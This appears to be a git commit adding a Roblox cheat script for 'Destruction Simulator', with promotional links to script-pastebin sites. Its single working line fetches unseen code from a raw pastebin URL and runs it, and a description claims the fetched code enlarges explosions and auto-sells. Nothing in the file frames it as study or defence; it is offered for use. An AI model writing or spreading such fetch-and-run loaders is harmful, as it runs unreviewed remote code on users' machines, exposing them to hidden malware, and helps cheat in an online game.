837ea850368a83202baeebbc2829de52bc4a0900
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-28 02:52:38 +0100

    commit zero

---
+++ Destruction Simulator Script pastebin roblox Destruction Simulator .lua
@@ -0,0 +1,11 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet("https://pastebin.com/raw/hLcu53QP", true))()
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							Script with an increase in the radius of the explosion and autosell
+						
+]]
